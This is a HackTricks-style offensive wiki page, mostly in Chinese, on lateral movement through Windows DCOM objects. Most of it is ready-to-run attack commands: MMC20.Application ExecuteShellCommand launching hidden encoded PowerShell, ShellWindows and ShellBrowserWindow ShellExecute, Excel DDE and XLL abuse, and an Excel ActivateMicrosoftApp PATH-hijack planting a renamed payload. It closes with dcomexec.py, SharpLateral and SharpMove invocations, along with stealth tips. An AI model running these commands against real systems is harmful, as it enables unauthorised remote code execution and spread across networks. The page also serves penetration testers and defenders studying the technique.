# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM 横向移动之所以有吸引力，是因为它复用通过 RPC/DCOM 暴露的现有 COM servers，而不是创建一个 service 或 scheduled task。实际中这意味着初始连接通常从 TCP/135 开始，然后转到动态分配的高位 RPC ports。

## Prerequisites & Gotchas

- 你通常需要在目标上具备 local administrator 上下文，而且远程 COM server 必须允许 remote launch/activation。
- 自 **2023 年 3 月 14 日** 起，Microsoft 对受支持系统强制执行 DCOM hardening。请求较低 activation authentication level 的旧客户端可能会失败，除非它们协商至少 `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`。现代 Windows 客户端通常会自动提升，因此当前 tooling 一般还能正常工作。
- 手动或脚本化的 DCOM execution 通常需要 TCP/135 以及目标的 dynamic RPC port range。如果你在使用 Impacket 的 `dcomexec.py` 并且想要返回 command output，通常还需要对 `ADMIN$`（或其他可写/可读 share）的 SMB access。
- 如果 RPC/DCOM 可用但 SMB 被阻止，`dcomexec.py -nooutput` 仍然可用于 blind execution。

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**有关此技术的更多信息，请查看原始文章 [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objects 为基于网络的对象交互提供了一种有趣的能力。Microsoft 为 DCOM 和 Component Object Model (COM) 提供了全面文档，可在 [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) 和 [here for COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) 查看。可以使用 PowerShell 命令检索 DCOM applications 列表：
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object，[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)，使得可以对 MMC snap-in 操作进行脚本化。值得注意的是，这个 object 在 `Document.ActiveView` 下包含一个 `ExecuteShellCommand` method。关于这个 method 的更多信息可以在 [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) 找到。查看它的运行情况：

此 feature 便于通过 DCOM application 在 network 上执行 commands。要以 admin 身份远程与 DCOM 交互，可以按如下方式使用 PowerShell：
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
这个命令连接到 DCOM application 并返回一个 COM object 的实例。然后可以调用 ExecuteShellCommand method 在远程主机上执行一个 process。该 process 包含以下步骤：

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
获得 RCE：
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
最后一个参数是窗口样式。`7` 会让窗口保持最小化。从操作上看，基于 MMC 的执行通常会导致远程 `mmc.exe` 进程启动你的 payload，这与下面这些由 Explorer 支持的对象不同。

## ShellWindows & ShellBrowserWindow

**有关此技术的更多信息，请查看原始文章 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** 对象被发现缺少显式的 "LaunchPermissions"，因此默认使用允许 Administrators 访问的权限。更多细节可以查看 [here](https://twitter.com/tiraniddo/status/817532039771525120) 的讨论线程，并且建议使用 [@tiraniddo](https://twitter.com/tiraniddo) 的 OleView .NET 来筛选没有显式 Launch Permission 的对象。

有两个特定对象，`ShellBrowserWindow` 和 `ShellWindows`，因其缺少显式 Launch Permissions 而被重点提及。`HKCR:\AppID\{guid}` 下不存在 `LaunchPermission` 注册表项，表示没有显式权限。

与 `MMC20.Application` 相比，从 OPSEC 角度看，这些对象通常更安静，因为命令在远程主机上往往会成为 `explorer.exe` 的子进程，而不是 `mmc.exe`。

### ShellWindows

对于没有 ProgID 的 `ShellWindows`，.NET 方法 `Type.GetTypeFromCLSID` 和 `Activator.CreateInstance` 可以通过其 AppID 方便地实例化该对象。这个过程利用 OleView .NET 获取 `ShellWindows` 的 CLSID。一旦实例化，就可以通过 `WindowsShell.Item` 方法进行交互，从而调用诸如 `Document.Application.ShellExecute` 之类的方法。

下面给出了用于实例化该对象并远程执行命令的 PowerShell 示例命令：
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` 类似，但你可以通过它的 CLSID 直接实例化它，并 pivot 到 `Document.Application.ShellExecute`：
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### 使用 Excel DCOM Objects 进行 Lateral Movement

可以通过利用 DCOM Excel objects 来实现 lateral movement。关于详细信息，建议阅读 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) 中关于通过 DCOM 利用 Excel DDE 进行 lateral movement 的讨论。

Empire project 提供了一个 PowerShell script，演示了通过操纵 DCOM objects 使用 Excel 进行 remote code execution (RCE)。下面是来自 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 的 script 片段，展示了滥用 Excel 实现 RCE 的不同方法：
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Recent research expanded this area with `Excel.Application`'s `ActivateMicrosoftApp()` method. The key idea is that Excel can try to launch legacy Microsoft applications such as FoxPro, Schedule Plus, or Project by searching the system `PATH`. If an operator can place a payload with one of those expected names in a writable location that is part of the target's `PATH`, Excel will execute it.

Requirements for this variation:

- 目标上有 Local admin
- 目标上已安装 Excel
- 能够将 payload 写入目标 `PATH` 中的可写目录

Practical example abusing the FoxPro lookup (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
如果攻击主机没有注册本地 `Excel.Application` ProgID，则改为通过 CLSID 实例化远程对象：
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
实践中被滥用的值：

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### 用于横向移动的自动化工具

这里强调了两个用于自动化这些技术的工具：

- **Invoke-DCOM.ps1**：由 Empire 项目提供的一个 PowerShell 脚本，用于简化在远程机器上执行代码的不同方法的调用。该脚本可在 Empire GitHub 仓库中获取。

- **SharpLateral**：一个用于远程执行代码的工具，可通过以下命令使用：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- PowerShell 脚本 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 允许轻松调用所有已注释的方式，在其他机器上执行代码。
- 你可以使用 Impacket 的 `dcomexec.py` 通过 DCOM 在远程系统上执行命令。当前版本支持 `ShellWindows`、`ShellBrowserWindow` 和 `MMC20`，默认使用 `ShellWindows`。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- 你也可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- 你也可以使用 [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 参考资料

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
